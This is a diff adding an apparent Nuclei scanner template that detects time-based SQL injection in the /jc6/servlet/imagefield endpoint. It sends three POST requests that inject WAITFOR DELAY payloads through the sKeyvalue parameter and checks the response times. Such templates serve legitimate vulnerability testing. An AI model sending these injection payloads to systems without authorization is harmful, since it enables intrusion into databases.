@@ -1,0 +1,53 @@
+id: jc6-imagefield-sqli
+
+info:
+  name: jc6-imagefield-sqli
+  author: jc6-imagefield-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:3'-----
+        
+      - |
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:6'-----
+
+      - |
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:9'-----       
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
